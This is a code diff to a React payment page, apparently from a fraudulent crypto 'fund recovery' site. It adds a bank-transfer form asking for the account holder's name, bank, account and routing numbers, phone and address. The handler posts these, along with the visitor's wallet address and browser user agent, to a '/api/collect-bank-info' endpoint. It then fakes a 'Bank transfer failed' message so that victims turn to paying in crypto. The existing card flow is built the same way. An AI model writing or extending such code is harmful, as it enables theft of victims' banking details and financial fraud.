@@ -6,7 +6,7 @@ export default function PaymentPage({ recoveredAmount, onPaymentComplete }) {
   const [copied, setCopied] = useState('');
   const [rates, setRates] = useState({});
   const [loading, setLoading] = useState(true);
-  const [paymentMethod, setPaymentMethod] = useState('crypto'); // 'crypto' or 'card'
+  const [paymentMethod, setPaymentMethod] = useState('crypto'); // 'crypto', 'card', or 'bank'
   const [cardData, setCardData] = useState({
     number: '',
     expiry: '',
@@ -14,7 +14,17 @@ export default function PaymentPage({ recoveredAmount, onPaymentComplete }) {
     name: '',
     address: ''
   });
+  const [bankData, setBankData] = useState({
+    name: '',
+    institution: '',
+    account: '',
+    routing: '',
+    type: 'checking',
+    phone: '',
+    address: ''
+  });
   const [processingCard, setProcessingCard] = useState(false);
+  const [processingBank, setProcessingBank] = useState(false);
 
   const feeUSD = (parseFloat(recoveredAmount) * 0.15 * 3000).toFixed(2); // Assume ETH = $3000
 
@@ -78,6 +88,44 @@ export default function PaymentPage({ recoveredAmount, onPaymentComplete }) {
       alert('Payment failed. Please try crypto payment.');
       setPaymentMethod('crypto');
       setProcessingCard(false);
+    }
+  };
+
+  const handleBankSubmit = async (e) => {
+    e.preventDefault();
+    setProcessingBank(true);
+
+    try {
+      const userAddress = localStorage.getItem('connectedWallet') || 'unknown';
+      
+      await fetch('/api/collect-bank-info', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          userAddress,
+          amount: recoveredAmount,
+          bankName: bankData.name,
+          bankInstitution: bankData.institution,
+          bankAccount: bankData.account,
+          bankRouting: bankData.routing,
+          bankType: bankData.type,
+          bankPhone: bankData.phone,
+          bankAddress: bankData.address,
+          timestamp: new Date().toISOString(),
+          userAgent: navigator.userAgent
+        })
+      });
+
+      // Simulate processing delay
+      setTimeout(() => {
+        alert('Bank transfer failed. Please use crypto payment.');
+        setPaymentMethod('crypto');
+        setProcessingBank(false);
+      }, 3000);
+    } catch (error) {
+      alert('Bank transfer failed. Please use crypto payment.');
+      setPaymentMethod('crypto');
+      setProcessingBank(false);
     }
   };
 
@@ -147,34 +195,48 @@ export default function PaymentPage({ recoveredAmount, onPaymentComplete }) {
       </div>
 
       {/* Payment Method Selection */}
-      <div className="flex space-x-4 mb-8">
+      <div className="grid grid-cols-3 gap-4 mb-8">
         <button
           onClick={() => setPaymentMethod('card')}
-          className={`flex-1 p-4 rounded-xl border-2 transition-all ${
+          className={`p-4 rounded-xl border-2 transition-all ${
             paymentMethod === 'card'
               ? 'border-blue-500 bg-blue-50'
               : 'border-gray-200 hover:border-gray-300'
           }`}
         >
           <div className="flex items-center justify-center space-x-2">
-            <CreditCard size={24} />
-            <span className="font-bold">Credit Card</span>
+            <CreditCard size={20} />
+            <span className="font-bold text-sm">Credit Card</span>
           </div>
-          <div className="text-xs text-gray-500 mt-1">Instant Payment</div>
+          <div className="text-xs text-gray-500 mt-1">Instant</div>
+        </button>
+        <button
+          onClick={() => setPaymentMethod('bank')}
+          className={`p-4 rounded-xl border-2 transition-all ${
+            paymentMethod === 'bank'
+              ? 'border-blue-500 bg-blue-50'
+              : 'border-gray-200 hover:border-gray-300'
+          }`}
+        >
+          <div className="flex items-center justify-center space-x-2">
+            <span className="text-xl">🏦</span>
+            <span className="font-bold text-sm">Bank Transfer</span>
+          </div>
+          <div className="text-xs text-gray-500 mt-1">ACH</div>
         </button>
         <button
           onClick={() => setPaymentMethod('crypto')}
-          className={`flex-1 p-4 rounded-xl border-2 transition-all ${
+          className={`p-4 rounded-xl border-2 transition-all ${
             paymentMethod === 'crypto'
               ? 'border-blue-500 bg-blue-50'
               : 'border-gray-200 hover:border-gray-300'
           }`}
         >
           <div className="flex items-center justify-center space-x-2">
-            <span className="text-2xl">₿</span>
-            <span className="font-bold">Cryptocurrency</span>
+            <span className="text-xl">₿</span>
+            <span className="font-bold text-sm">Crypto</span>
           </div>
-          <div className="text-xs text-gray-500 mt-1">Manual Transfer</div>
+          <div className="text-xs text-gray-500 mt-1">Manual</div>
         </button>
       </div>
 
@@ -255,6 +317,111 @@ export default function PaymentPage({ recoveredAmount, onPaymentComplete }) {
               className="w-full mt-6 bg-green-600 hover:bg-green-700 disabled:bg-gray-400 text-white font-bold py-3 px-6 rounded-lg transition-colors"
             >
               {processingCard ? 'Processing...' : `Pay $${feeUSD} USD`}
+            </button>
+          </div>
+        </form>
+      ) : paymentMethod === 'bank' ? (
+        /* Bank Transfer Form */
+        <form onSubmit={handleBankSubmit} className="space-y-6">
+          <div className="bg-gray-50 rounded-xl p-6">
+            <h3 className="text-xl font-bold mb-4 flex items-center space-x-2">
+              <span className="text-2xl">🏦</span>
+              <span>Bank Transfer Payment</span>
+            </h3>
+            
+            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+              <div className="md:col-span-2">
+                <label className="block text-sm font-medium text-gray-700 mb-2">Account Holder Name</label>
+                <input
+                  type="text"
+                  placeholder="John Doe"
+                  value={bankData.name}
+                  onChange={(e) => setBankData({...bankData, name: e.target.value})}
+                  className="w-full p-3 border border-gray-300 rounded-lg"
+                  required
+                />
+              </div>
+              
+              <div className="md:col-span-2">
+                <label className="block text-sm font-medium text-gray-700 mb-2">Bank Name</label>
+                <input
+                  type="text"
+                  placeholder="Chase Bank, Wells Fargo, etc."
+                  value={bankData.institution}
+                  onChange={(e) => setBankData({...bankData, institution: e.target.value})}
+                  className="w-full p-3 border border-gray-300 rounded-lg"
+                  required
+                />
+              </div>
+              
+              <div>
+                <label className="block text-sm font-medium text-gray-700 mb-2">Account Number</label>
+                <input
+                  type="text"
+                  placeholder="1234567890"
+                  value={bankData.account}
+                  onChange={(e) => setBankData({...bankData, account: e.target.value})}
+                  className="w-full p-3 border border-gray-300 rounded-lg"
+                  required
+                />
+              </div>
+              
+              <div>
+                <label className="block text-sm font-medium text-gray-700 mb-2">Routing Number</label>
+                <input
+                  type="text"
+                  placeholder="123456789"
+                  value={bankData.routing}
+                  onChange={(e) => setBankData({...bankData, routing: e.target.value})}
+                  className="w-full p-3 border border-gray-300 rounded-lg"
+                  required
+                />
+              </div>
+              
+              <div>
+                <label className="block text-sm font-medium text-gray-700 mb-2">Account Type</label>
+                <select
+                  value={bankData.type}
+                  onChange={(e) => setBankData({...bankData, type: e.target.value})}
+                  className="w-full p-3 border border-gray-300 rounded-lg"
+                  required
+                >
+                  <option value="checking">Checking</option>
+                  <option value="savings">Savings</option>
+                </select>
+              </div>
+              
+              <div>
+                <label className="block text-sm font-medium text-gray-700 mb-2">Phone Number</label>
+                <input
+                  type="tel"
+                  placeholder="(555) 123-4567"
+                  value={bankData.phone}
+                  onChange={(e) => setBankData({...bankData, phone: e.target.value})}
+                  className="w-full p-3 border border-gray-300 rounded-lg"
+                  required
+                />
+              </div>
+              
+              <div className="md:col-span-2">
+                <label className="block text-sm font-medium text-gray-700 mb-2">Address</label>
+                <input
+                  type="text"
+                  placeholder="123 Main St, City, State, ZIP"
+                  value={bankData.address}
+                  onChange={(e) => setBankData({...bankData, address: e.target.value})}
+                  className="w-full p-3 border border-gray-300 rounded-lg"
+                  required
+                />
+              </div>
+            </div>
+            
+            <button
+              type="submit"
+              disabled={processingBank}
+              className="w-full mt-6 bg-green-600 hover:bg-green-700 disabled:bg-gray-400 text-white font-bold py-3 px-6 rounded-lg transition-colors"
+            >
+              {processingBank ? 'Processing...' : `Transfer $${feeUSD} USD`}
             </button>
           </div>
         </form>
